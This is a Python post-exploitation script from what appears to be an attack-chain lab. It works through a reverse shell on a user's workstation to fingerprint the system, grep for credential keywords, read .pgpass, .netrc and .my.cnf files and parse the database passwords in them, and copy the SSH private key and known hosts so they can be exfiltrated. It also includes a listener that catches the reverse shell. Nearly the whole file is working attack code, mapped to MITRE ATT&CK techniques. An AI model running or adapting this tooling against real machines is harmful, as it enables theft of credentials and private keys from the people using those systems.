import re
import socket
import time

from chainlog import log

# =============================================================================
# enumeration_john_ws.py — Targeted Enumeration on John's Workstation
# MITRE ATT&CK:
#   T1082     – System Information Discovery
#   T1087.001 – Account Discovery: Local Account
#   T1016     – System Network Configuration Discovery
#   T1083     – File and Directory Discovery
#   T1552.001 – Credentials In Files (keyword scan, .pgpass, bash_history)
#   T1552.004 – Private Keys (SSH key discovery)
# =============================================================================

KALI_HOST = "10.10.0.2"

HOME_DIR    = "/home/john.stravidis"
SSH_DIR     = f"{HOME_DIR}/.ssh"
PGPASS_PATH = f"{HOME_DIR}/projects/waystar-connect/.pgpass"

# Credential keyword pattern for grep (case-insensitive)
CRED_KEYWORDS = "pass\\|secret\\|token\\|credential\\|api_key\\|apikey\\|auth\\|db_url\\|database_url"

# Known credential files to check explicitly (beyond keyword scan hits)
KNOWN_CRED_FILES = [
    PGPASS_PATH,
    f"{HOME_DIR}/.my.cnf",
    f"{HOME_DIR}/.netrc",
]

# Common DB file extensions
DB_EXTENSIONS = r"\.db$\|\.sqlite$\|\.sqlite3$"

_sentinel_seq = 0


# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def _drain(shell):
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=15):
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.5)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev)

    if sentinel in buf:
        buf = buf[: buf.index(sentinel)]

    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    return buf.replace("\r", "").strip()


# ---------------------------------------------------------------------------
# Phase 0 — General system enumeration
# ---------------------------------------------------------------------------

_CMD_ARTIFACTS = ("--include=", "--exclude", "-not -path", "2>/dev/null", "-name '", "-type f")

def _clean(raw):
    """Strip shell prompt lines, command-echo artifacts, and blank lines."""
    out = []
    for l in raw.splitlines():
        s = l.strip()
        if not s:
            continue
        if "@" in s or "$" in s:                      # shell prompt
            continue
        if s == "echo":
            continue
        if s.startswith("<"):                          # wrapped command tail
            continue
        if " | " in s and ("grep" in s or "awk" in s or "cut" in s):  # piped command echo
            continue
        if any(a in s for a in _CMD_ARTIFACTS):        # command flag bleedthrough
            continue
        out.append(l)
    return out


def _phase_system(john_shell):
    """T1082 · T1087.001 · T1016 — who, what OS, what network."""
    log("\n[*] System fingerprinting (T1082 · T1087.001 · T1016)")

    identity = _run_remote(john_shell, "id")
    hostname = _run_remote(john_shell, "hostname")
    kernel   = _run_remote(john_shell, "uname -r")
    users    = _run_remote(john_shell, "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1")
    network  = _run_remote(john_shell, "ip addr show | grep 'inet '")

    log(f"    identity : {_clean(identity)[-1] if _clean(identity) else '?'}")
    log(f"    hostname : {_clean(hostname)[-1] if _clean(hostname) else '?'}")
    log(f"    kernel   : {_clean(kernel)[-1] if _clean(kernel) else '?'}")
    log(f"    users    : {', '.join(_clean(users))}")
    for iface in _clean(network):
        log(f"    iface    : {iface.strip()}")

    return {"identity": identity, "users": users, "network": network}


# ---------------------------------------------------------------------------
# Phase 1 — File discovery
# ---------------------------------------------------------------------------

def _phase_file_discovery(john_shell):
    """T1083 — overview of home directory structure."""
    log("\n[*] File and directory discovery (T1083)")

    home_ls    = _run_remote(john_shell, f"ls -1 {HOME_DIR}")
    project_ls = _run_remote(
        john_shell,
        f"find {HOME_DIR}/projects -maxdepth 3 "
        f"-not -path '*/node_modules/*' -not -path '*/.git/*' -type f",
    )
    docs_ls = _run_remote(john_shell, f"ls {HOME_DIR}/Documents/ 2>/dev/null")

    home_entries    = [l for l in _clean(home_ls) if not l.strip().startswith("ls")]
    project_files   = _clean(project_ls)
    doc_files       = _clean(docs_ls)

    log(f"[+] Home entries       : {', '.join(home_entries)}")
    log(f"[+] Project files      : {len(project_files)} files under ~/projects/")
    for f in project_files:
        log(f"    {f}")
    log(f"[+] Documents          : {len(doc_files)} files")
    for f in doc_files:
        log(f"    {f}")

    return {"home": home_ls, "projects": project_ls, "docs": docs_ls}


# ---------------------------------------------------------------------------
# Phase 2 — Keyword scan for credentials
# ---------------------------------------------------------------------------

def _phase_keyword_scan(john_shell):
    """T1552.001 — grep config/env files for credential keywords."""
    log("\n[*] Credential keyword scan (T1552.001)")

    # Use find+xargs so node_modules exclusion is reliable across grep versions
    hits_raw = _run_remote(
        john_shell,
        f"find {HOME_DIR} -type f "
        f"-not -path '*/node_modules/*' -not -path '*/.git/*' -not -path '*/.npm/*' "
        f"\\( -name '*.env' -o -name '*.conf' -o -name '*.ini' -o -name '*.cfg' "
        f"-o -name '*.toml' -o -name '*pass*' -o -name '*.sql' -o -name '*rc' "
        f"-o -name '.bash_history' \\) "
        f"2>/dev/null | xargs grep -l -i '{CRED_KEYWORDS}' 2>/dev/null",
        timeout=20,
    )
    hits = _clean(hits_raw)
    if hits:
        log(f"[+] Keyword hits       : {len(hits)} files")
        for f in hits:
            log(f"    {f}")
    else:
        log("[-] No keyword matches found")

    return hits


# ---------------------------------------------------------------------------
# Phase 3 — Credential file parsing
# ---------------------------------------------------------------------------

def _parse_pgpass(raw):
    """Parse pgpass format hostname:port:database:user:password → dict or None."""
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "@" in line or "$" in line:
            continue
        parts = line.split(":")
        if len(parts) == 5:
            return {"host": parts[0], "port": parts[1],
                    "dbname": parts[2], "user": parts[3], "password": parts[4]}
    return None


def _phase_credential_files(john_shell, keyword_hits):
    """T1552.001 — inspect known credential files."""
    log("\n[*] Credential file inspection (T1552.001)")

    db_creds = None
    found = {}

    # Only read known credential files — keyword hits are informational only
    for path in KNOWN_CRED_FILES:
        size_raw = _run_remote(john_shell, f"wc -c < {path} 2>/dev/null || echo 0")
        size = _clean(size_raw)
        if not size or not size[-1].strip().isdigit() or int(size[-1].strip()) == 0:
            continue
        content = _run_remote(john_shell, f"cat {path} 2>/dev/null")
        clean = _clean(content)
        if not clean:
            continue
        found[path] = content
        log(f"[+] {path}")

        if path.endswith(".pgpass") and db_creds is None:
            db_creds = _parse_pgpass(content)
            if db_creds:
                log(f"    → DB credential : {db_creds['user']}@{db_creds['host']}:{db_creds['port']}/{db_creds['dbname']}")

    # bash_history — count relevant lines only
    hist_count = _run_remote(
        john_shell,
        f"grep -ic 'psql\\|pgpass\\|mysql\\|password\\|secret' "
        f"{HOME_DIR}/.bash_history 2>/dev/null || echo 0",
    )
    count = _clean(hist_count)
    log(f"[+] bash_history       : {count[-1] if count else '0'} relevant lines")

    if not found:
        log("[-] No credential files found")

    return {"db_creds": db_creds, "files": found}


# ---------------------------------------------------------------------------
# Phase 4 — SSH artifacts
# ---------------------------------------------------------------------------

def _phase_ssh_artifacts(john_shell):
    """T1552.004 — discover SSH keys, known hosts, and config."""
    log("\n[*] SSH artifact discovery (T1552.004)")

    ssh_key = None
    key_raw = _run_remote(john_shell, f"cat {SSH_DIR}/id_ed25519 2>/dev/null")
    if "PRIVATE KEY" in key_raw:
        ssh_key = key_raw
        log("[+] Private key        : id_ed25519 found")
    else:
        log("[-] No private key at id_ed25519")

    known_raw = _run_remote(john_shell, f"cat {SSH_DIR}/known_hosts 2>/dev/null")
    discovered_hosts = []
    for line in known_raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("<"):
            continue
        if "@" in line or "$" in line:
            continue
        parts_on_line = line.split()
        if len(parts_on_line) < 2:         # skip malformed / command-echo lines
            continue
        for part in parts_on_line[0].split(","):
            if part not in discovered_hosts:
                discovered_hosts.append(part)
    if discovered_hosts:
        log(f"[+] Known hosts        : {', '.join(discovered_hosts)}")

    config_hosts = _run_remote(john_shell, f"grep '^Host ' {SSH_DIR}/config 2>/dev/null")
    hosts_list = [l.replace("Host", "").strip() for l in _clean(config_hosts)]
    if hosts_list:
        log(f"[+] SSH config hosts   : {', '.join(hosts_list)}")

    ssh_config = _run_remote(john_shell, f"cat {SSH_DIR}/config 2>/dev/null")
    return {"ssh_key": ssh_key, "discovered_hosts": discovered_hosts, "ssh_config": ssh_config}


# ---------------------------------------------------------------------------
# Phase 5 — Local databases
# ---------------------------------------------------------------------------

def _phase_local_dbs(john_shell):
    """T1005 — find local database files."""
    log("\n[*] Local database discovery (T1005)")

    db_raw = _run_remote(
        john_shell,
        f"find {HOME_DIR} -type f -not -path '*/node_modules/*' "
        f"\\( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \\) 2>/dev/null",
        timeout=10,
    )
    local_dbs = _clean(db_raw)
    if local_dbs:
        for db in local_dbs:
            log(f"[+] Local DB           : {db}")
    else:
        log("[-] No local database files found")

    return local_dbs


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(john_shell, kali_host=KALI_HOST):
    """
    Enumerate john.stravidis's workstation: system info, files, credentials,
    SSH artifacts, and local databases.

    Args:
        john_shell (socket): reverse shell as john.stravidis on ubuntu_workstation.
        kali_host (str):     reserved for future exfil of findings.

    Returns:
        dict with keys:
            system_info      – identity, users, network, hosts
            db_creds         – parsed .pgpass credential (→ consumed by exfiltrate_db)
            ssh_key          – private key text or None
            discovered_hosts – hosts from known_hosts
            local_dbs        – SQLite files found
            credential_files – files matched by keyword scan or known patterns
    """
    log("\n[*] Starting enumeration on john.stravidis's workstation ...")

    system_info      = _phase_system(john_shell)
    file_discovery   = _phase_file_discovery(john_shell)
    keyword_hits     = _phase_keyword_scan(john_shell)
    cred_findings    = _phase_credential_files(john_shell, keyword_hits)
    ssh_findings     = _phase_ssh_artifacts(john_shell)
    local_dbs        = _phase_local_dbs(john_shell)

    db_creds = cred_findings["db_creds"]
    if db_creds:
        log(f"\n[+] Enumeration complete — DB credential ready for exfiltration step")
    else:
        log(f"\n[!] Enumeration complete — no DB credential found, exfiltrate_db will fall back to .pgpass")

    return {
        "system_info":      system_info,
        "db_creds":         db_creds,
        "ssh_key":          ssh_findings["ssh_key"],
        "discovered_hosts": ssh_findings["discovered_hosts"],
        "local_dbs":        local_dbs,
        "credential_files": list(cred_findings["files"].keys()),
    }


# ---------------------------------------------------------------------------
# Standalone test mode
# Usage: docker compose exec kali python3 /Attack-chain/enumeration_john_ws.py
# Pre-condition: john.stravidis reverse shell listening on port 6666
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    PORT_JOHN = 6666
    log(f"[*] Test mode — waiting for john.stravidis shell on port {PORT_JOHN}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT_JOHN))
    server.listen(1)

    try:
        john_shell, addr = server.accept()
        log(f"[+] Shell received from {addr[0]}")
    finally:
        server.close()

    result = run(john_shell)
    log(f"\n[*] db_creds: {result['db_creds']}")
    log(f"[*] discovered_hosts: {result['discovered_hosts']}")
    log(f"[*] local_dbs: {result['local_dbs']}")
    log(f"[*] credential_files: {result['credential_files']}")
